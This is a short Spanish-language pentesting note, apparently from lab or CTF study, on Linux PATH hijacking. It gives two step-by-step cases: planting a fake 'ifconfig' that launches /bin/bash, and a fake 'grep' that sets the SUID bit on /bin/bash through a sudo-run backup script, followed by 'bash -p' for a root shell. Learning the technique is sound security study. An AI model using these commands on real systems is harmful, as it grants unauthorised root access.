## PATH Hijacking
Es una vulnerabilidad que nos permite alterar el funcionamiento normal del sistema para ejecutar binarios que no son lejítimos, como si realmente lo fueran.

#### CASO 1
Supongamos que tenemos un binario que por defecto/mala configuración podemos ejecutar como root, pero no se puede explotar como con **GTFOBins**. Por ejemplo, ____un script que se ejecuta como root, que contiene el comando "ifconfig"___

___También sirve para ese mismo binario si tuviera permisos para ejecutarse como root, se puede secuestrar el path___

Ver la variable de entorno $PATH
```bash
echo $PATH
```

añadir una ruta al $PATH
```bash
export PATH=/ruta_que_queramos_añadir:$PATH
"EJEMPLO"
export PATH=/home/kali:$PATH
```

crear un binario malicioso
```bash
nano ifconfig
(contenido:
/bin/bash)

chmod +x ifconfig
```

De esta manera, si tenemos un binario en **/home/kali** llamado **ifconfig** cuyo contenido sea el siguiente:
```bash
/bin/bash
``` 
, al lanzar el script que contiene el comando **ifconfig**, la primera ruta donde buscará en el $PATH, será /home/kali y encontrará nuestro binario malicioso.

#### CASO 2
Tenemos un binario/script (a priori inútil) pero que se puede ejecutar como root, por ejemplo **backup.sh**, y este backup contiene algún comando, por ejemplo **grep**. Aunque el binario no sea editable, podemos aprovechar este script para alterar el path.

1º Nos dirigimos a **/tmp** o a algún directorio editable y creamos un binario de un comando que esté contenido en el script, por ejemplo **grep** con el siguiente contenido:
```bash
chmod u+s /bin/bash
```

2º En el terminal (aprovechamos los privilegios para lanzar el backup.sh para alterar el path):
```bash
sudo PATH=.:$PATH /ruta/al/backup.sh
```

3º 
```bash
bash -p
```
